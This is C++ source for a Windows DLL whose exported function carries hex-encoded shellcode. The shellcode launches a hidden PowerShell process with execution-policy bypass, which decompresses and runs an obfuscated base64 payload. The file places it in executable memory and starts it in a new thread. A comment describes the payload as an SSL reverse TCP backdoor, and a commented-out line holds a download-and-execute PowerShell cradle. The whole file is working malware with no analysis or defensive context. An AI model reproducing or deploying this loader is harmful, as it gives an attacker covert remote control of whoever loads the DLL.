#include <windows.h>;
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  nReason, LPVOID lpReserved) {
    switch (nReason) {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) int Denosing() {
    
    unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x70\x6f\x77"
"\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78\x65\x20\x2d\x6e\x6f"
"\x70\x20\x2d\x77\x20\x68\x69\x64\x64\x65\x6e\x20\x2d\x6e\x6f"
"\x6e\x69\x20\x2d\x65\x70\x20\x62\x79\x70\x61\x73\x73\x20\x22"
"\x26\x28\x5b\x73\x63\x72\x69\x70\x74\x62\x6c\x6f\x63\x6b\x5d"
"\x3a\x3a\x63\x72\x65\x61\x74\x65\x28\x28\x4e\x65\x77\x2d\x4f"
"\x62\x6a\x65\x63\x74\x20\x53\x79\x73\x74\x65\x6d\x2e\x49\x4f"
"\x2e\x53\x74\x72\x65\x61\x6d\x52\x65\x61\x64\x65\x72\x28\x4e"
"\x65\x77\x2d\x4f\x62\x6a\x65\x63\x74\x20\x53\x79\x73\x74\x65"
"\x6d\x2e\x49\x4f\x2e\x43\x6f\x6d\x70\x72\x65\x73\x73\x69\x6f"
"\x6e\x2e\x47\x7a\x69\x70\x53\x74\x72\x65\x61\x6d\x28\x28\x4e"
"\x65\x77\x2d\x4f\x62\x6a\x65\x63\x74\x20\x53\x79\x73\x74\x65"
"\x6d\x2e\x49\x4f\x2e\x4d\x65\x6d\x6f\x72\x79\x53\x74\x72\x65"
"\x61\x6d\x28\x2c\x5b\x53\x79\x73\x74\x65\x6d\x2e\x43\x6f\x6e"
"\x76\x65\x72\x74\x5d\x3a\x3a\x46\x72\x6f\x6d\x42\x61\x73\x65"
"\x36\x34\x53\x74\x72\x69\x6e\x67\x28\x28\x28\x27\x48\x34\x73"
"\x49\x41\x43\x37\x4f\x69\x47\x4d\x43\x41\x7b\x31\x7d\x56\x56"
"\x58\x57\x2f\x62\x4e\x68\x52\x39\x39\x36\x2b\x34\x4d\x4c\x52"
"\x46\x51\x69\x7a\x43\x38\x59\x71\x68\x44\x5a\x42\x69\x6e\x70"
"\x6f\x4f\x41\x62\x4c\x57\x71\x4c\x4c\x6c\x77\x54\x41\x51\x6d"
"\x72\x71\x4f\x74\x64\x43\x6b\x53\x31\x4b\x78\x6a\x63\x54\x2f"
"\x66\x61\x52\x45\x66\x54\x68\x4f\x73\x27\x2b\x27\x46\x55\x50"
"\x74\x73\x52\x37\x65\x58\x68\x34\x37\x72\x6e\x6b\x6f\x68\x44"
"\x4d\x7b\x31\x7d\x46\x4c\x41\x48\x32\x6a\x69\x57\x7b\x31\x7d"
"\x77\x7a\x6e\x71\x4d\x77\x30\x48\x76\x71\x67\x58\x32\x43\x44"
"\x59\x4d\x4c\x2b\x49\x4b\x62\x2b\x4f\x76\x38\x48\x32\x51\x47"
"\x34\x70\x76\x64\x47\x72\x2f\x51\x46\x64\x70\x42\x51\x32\x78"
"\x2b\x55\x75\x62\x58\x79\x65\x51\x76\x6a\x5a\x39\x77\x51\x51"
"\x74\x75\x45\x6f\x57\x5a\x6a\x65\x53\x55\x61\x77\x73\x52\x47"
"\x46\x56\x67\x6b\x7a\x56\x52\x63\x72\x73\x6a\x4c\x7a\x4c\x73"
"\x65\x47\x65\x27\x2b\x27\x6b\x27\x2b\x27\x7a\x75\x7b\x32\x7d"
"\x74\x65\x34\x75\x61\x34\x6c\x70\x75\x55\x4e\x6b\x76\x79\x77"
"\x37\x4b\x2b\x49\x51\x71\x75\x67\x71\x72\x39\x32\x6c\x71\x56"
"\x43\x37\x75\x5a\x30\x45\x69\x56\x79\x73\x71\x73\x73\x48\x68"
"\x61\x4b\x6f\x7b\x31\x7d\x6b\x2b\x4c\x46\x34\x43\x65\x7b\x31"
"\x7d\x45\x56\x7a\x53\x72\x42\x79\x4e\x50\x4b\x61\x53\x44\x4c"
"\x55\x47\x4c\x38\x42\x4b\x5a\x67\x56\x48\x52\x2f\x43\x7b\x32"
"\x7d\x4d\x49\x49\x71\x4a\x56\x39\x41\x57\x43\x38\x44\x4d\x58"
"\x36\x48\x2f\x6a\x77\x58\x57\x54\x38\x71\x67\x39\x57\x38\x63"
"\x69\x37\x50\x74\x55\x47\x42\x79\x6b\x36\x65\x70\x6a\x76\x37"
"\x76\x69\x4a\x4f\x74\x56\x53\x79\x42\x7a\x53\x61\x7b\x32\x7d"
"\x4c\x44\x31\x74\x63\x2b\x59\x76\x66\x76\x77\x79\x2b\x68\x34"
"\x49\x74\x47\x47\x4b\x75\x50\x57\x39\x53\x75\x58\x55\x56\x2b"
"\x69\x69\x30\x37\x65\x6d\x44\x46\x63\x47\x77\x74\x59\x6c\x53"
"\x4f\x73\x71\x4f\x7a\x66\x6f\x71\x76\x77\x45\x5a\x58\x47\x59"
"\x38\x59\x4e\x64\x4b\x66\x6b\x72\x7a\x46\x50\x4a\x6e\x36\x68"
"\x2f\x74\x6d\x48\x45\x54\x6e\x37\x39\x54\x30\x27\x2b\x27\x5a"
"\x44\x64\x2b\x52\x73\x39\x48\x37\x2f\x73\x44\x74\x78\x43\x2f"
"\x66\x71\x79\x54\x55\x52\x69\x46\x64\x4f\x62\x34\x56\x50\x4c"
"\x46\x57\x53\x38\x73\x78\x79\x27\x2b\x27\x37\x4e\x6c\x57\x46"
"\x57\x6f\x49\x75\x6a\x63\x30\x76\x63\x46\x36\x64\x44\x54\x6d"
"\x71\x63\x31\x32\x42\x73\x4d\x6b\x52\x55\x71\x4e\x7a\x75\x53"
"\x31\x71\x6d\x68\x58\x7b\x32\x7d\x38\x51\x4c\x4b\x79\x74\x63"
"\x42\x41\x2b\x42\x54\x63\x57\x66\x51\x38\x78\x31\x54\x41\x39"
"\x6d\x50\x4d\x4e\x56\x39\x4a\x67\x67\x73\x72\x6b\x69\x7b\x31"
"\x7d\x78\x52\x67\x7b\x32\x7d\x39\x54\x6e\x6d\x66\x55\x65\x53"
"\x2b\x68\x6e\x4d\x38\x70\x65\x7b\x31\x7d\x68\x46\x30\x53\x74"
"\x30\x79\x4c\x67\x77\x53\x32\x64\x63\x4e\x32\x6d\x73\x7b\x32"
"\x7d\x39\x51\x6d\x45\x41\x58\x6e\x67\x37\x37\x68\x2b\x6d\x7a"
"\x55\x39\x34\x53\x36\x65\x49\x31\x51\x37\x55\x61\x37\x53\x6b"
"\x37\x6e\x4f\x34\x50\x54\x32\x53\x78\x77\x2f\x38\x36\x53\x51"
"\x32\x4b\x78\x37\x66\x50\x38\x30\x39\x4e\x77\x37\x38\x56\x47"
"\x6b\x64\x58\x68\x63\x47\x70\x77\x61\x77\x67\x4b\x4a\x6a\x50"
"\x6e\x39\x2f\x50\x7a\x63\x5a\x70\x63\x58\x55\x57\x75\x41\x4c"
"\x2b\x37\x6e\x4c\x42\x2f\x61\x34\x30\x72\x4e\x78\x6f\x6d\x72"
"\x72\x58\x53\x4a\x58\x49\x27\x2b\x27\x4f\x71\x68\x44\x43\x5a"
"\x6f\x4f\x56\x70\x39\x44\x57\x76\x48\x30\x34\x68\x51\x44\x46"
"\x34\x37\x6e\x37\x45\x71\x37\x31\x54\x2b\x32\x59\x72\x56\x51"
"\x54\x59\x48\x4b\x31\x4c\x6b\x77\x62\x76\x42\x4f\x4a\x58\x4f"
"\x39\x55\x66\x72\x38\x30\x45\x43\x59\x52\x2f\x4a\x6b\x7a\x4a"
"\x62\x56\x27\x2b\x27\x63\x47\x45\x69\x6b\x57\x6b\x74\x56\x4b"
"\x6b\x70\x67\x37\x42\x5a\x7a\x53\x52\x6f\x55\x57\x75\x78\x48"
"\x7a\x4d\x69\x64\x75\x42\x50\x65\x6c\x6c\x34\x4f\x63\x6d\x74"
"\x72\x67\x32\x47\x37\x73\x63\x46\x77\x30\x48\x36\x51\x61\x78"
"\x54\x7b\x32\x7d\x5a\x74\x6e\x31\x55\x64\x7b\x32\x7d\x55\x58"
"\x53\x63\x64\x47\x65\x6e\x48\x56\x4a\x71\x65\x7a\x75\x44\x61"
"\x51\x6a\x70\x5a\x2f\x49\x46\x41\x47\x70\x34\x2f\x7a\x72\x57"
"\x65\x39\x56\x6d\x71\x53\x38\x71\x57\x6c\x6e\x4d\x46\x43\x72"
"\x6c\x6f\x44\x70\x77\x32\x71\x36\x58\x74\x6e\x76\x44\x67\x6e"
"\x49\x7b\x31\x7d\x49\x76\x64\x76\x71\x53\x4b\x75\x52\x6f\x75"
"\x63\x72\x38\x53\x67\x66\x4d\x4c\x37\x63\x72\x71\x32\x32\x32"
"\x75\x72\x64\x6f\x4f\x79\x37\x6c\x74\x6f\x73\x63\x34\x7b\x27"
"\x2b\x27\x31\x7d\x68\x47\x4f\x53\x6c\x36\x36\x70\x4e\x66\x45"
"\x4f\x61\x68\x5a\x58\x48\x42\x6a\x41\x63\x51\x48\x44\x41\x50"
"\x6f\x4a\x59\x49\x41\x79\x50\x4a\x4c\x31\x30\x2b\x6d\x46\x32"
"\x59\x37\x56\x38\x36\x38\x72\x77\x66\x65\x70\x53\x53\x4b\x6e"
"\x78\x70\x64\x65\x38\x52\x62\x48\x64\x52\x68\x32\x56\x44\x70"
"\x6f\x2f\x4c\x73\x72\x64\x27\x2b\x27\x31\x61\x4a\x43\x6b\x45"
"\x63\x76\x71\x6d\x6d\x62\x30\x78\x58\x7a\x61\x4e\x38\x51\x31"
"\x30\x64\x66\x42\x54\x37\x36\x2b\x50\x4d\x5a\x50\x4d\x50\x58"
"\x77\x73\x51\x56\x4b\x6e\x6a\x7a\x48\x45\x43\x4e\x6f\x42\x53"
"\x27\x2b\x27\x6b\x42\x6a\x36\x46\x6b\x30\x6b\x27\x2b\x27\x4b"
"\x4a\x2f\x61\x2f\x31\x50\x39\x61\x73\x74\x4c\x44\x45\x5a\x6c"
"\x51\x73\x7b\x32\x7d\x54\x52\x6a\x7b\x32\x7d\x44\x53\x67\x6d"
"\x77\x64\x6b\x51\x43\x56\x6b\x6d\x6f\x36\x6e\x42\x30\x73\x31"
"\x6d\x46\x27\x2b\x27\x64\x78\x67\x6e\x6a\x53\x46\x55\x59\x27"
"\x2b\x27\x76\x63\x62\x67\x6f\x76\x74\x68\x57\x32\x7b\x32\x7d"
"\x62\x4f\x7a\x62\x77\x2f\x2f\x4a\x76\x43\x2f\x4f\x66\x6a\x75"
"\x30\x61\x39\x73\x69\x76\x39\x5a\x7a\x50\x76\x4e\x44\x4c\x7b"
"\x31\x7d\x6a\x62\x30\x42\x34\x38\x2f\x32\x78\x4d\x75\x4e\x66"
"\x72\x39\x6c\x4f\x31\x59\x7b\x32\x7d\x31\x46\x64\x77\x37\x51"
"\x58\x56\x32\x72\x6b\x75\x72\x36\x74\x2f\x4b\x39\x31\x5a\x6e"
"\x50\x52\x4e\x37\x58\x7a\x4e\x78\x62\x45\x2f\x70\x5a\x77\x62"
"\x66\x30\x76\x4d\x65\x39\x50\x31\x4c\x73\x49\x41\x41\x41\x7b"
"\x30\x7d\x27\x29\x2d\x66\x27\x3d\x27\x2c\x27\x35\x27\x2c\x27"
"\x33\x27\x29\x29\x29\x29\x2c\x5b\x53\x79\x73\x74\x65\x6d\x2e"
"\x49\x4f\x2e\x43\x6f\x6d\x70\x72\x65\x73\x73\x69\x6f\x6e\x2e"
"\x43\x6f\x6d\x70\x72\x65\x73\x73\x69\x6f\x6e\x4d\x6f\x64\x65"
"\x5d\x3a\x3a\x44\x65\x63\x6f\x6d\x70\x72\x65\x73\x73\x29\x29"
"\x29\x2e\x52\x65\x61\x64\x54\x6f\x45\x6e\x64\x28\x29\x29\x29"
"\x22\x00";

//auto powershell = system((const char*)buf);//hm obsolete

int scs = sizeof(buf);
void* memy;

memy = VirtualAlloc(NULL, scs, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
RtlMoveMemory(memy, buf, scs);
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memy, NULL, 0, NULL);
Sleep(215000);
return 0;
//ssl reverse tcp backdoor from powershelll base 64 code execution shellcode.

 //auto powershell = "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('')\"";
};
